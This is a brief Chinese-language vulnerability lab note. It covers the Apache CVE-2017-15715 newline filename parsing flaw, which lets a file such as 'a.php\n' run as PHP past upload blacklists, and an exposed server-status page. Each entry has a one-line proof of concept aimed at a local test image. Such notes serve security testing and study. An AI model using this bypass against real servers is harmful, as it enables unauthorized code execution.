### CVE-2017-15715 - 换行符解析漏洞

简要说明

* 当文件名为 `a.php\n` 时，Apache 依然会当做PHP脚本去处理，造成漏洞

测试镜像

* src/base/php5.4

参考资料

* [利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单](https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html)

Poc

```
python -c 'with open("/var/www/html/a.php\n", "wb") as f: f.write("<?php phpinfo(); ?>")' 
```

### 运维安全 - server-status 暴露漏洞

测试镜像

* src/base/php5.4

Poc

```
curl 127.0.0.1/server-status/
```

